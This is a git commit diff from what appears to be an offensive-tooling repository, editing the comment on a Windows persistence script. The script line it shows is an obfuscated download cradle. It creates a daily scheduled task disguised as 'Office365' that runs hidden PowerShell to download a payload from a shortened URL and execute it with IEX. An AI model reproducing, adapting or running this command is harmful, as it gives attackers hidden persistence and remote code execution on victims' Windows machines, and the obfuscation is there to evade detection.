b68a45a5bdd99036e81871a76cbd7f4a27f49a3d
VirtualAllocEx <50073731+VirtualAlllocEx@users.noreply.github.com>
2022-03-25 15:01:36 +0100

    Update Taskschedule_Persistence.cmd

--- Taskschedule_Persistence.cmd
+++ Taskschedule_Persistence.cmd
@@ -1,2 +1,2 @@
-# Obfuscated Windows Command Shell Cradles which can be used in a cmd.exe to create a taskschedule persistence 
+# Not proxy aware obfuscated Windows Command Shell Cradles, which can be used to create a taskschedule persistence to download a PowerShell payload
 cmd> SchTasks /Create /SC DAILY /ST 12:00 /TN Office365 /TR "pOwErsHelL -w hidDEn -nOpR  -coM 'I`eX (N`E`W`-obje`CT Net.Webclient).\\\"dowNloa`DST`RIng\\\"((\\\"https://cutt.ly/WS8Vek5\\\"))""
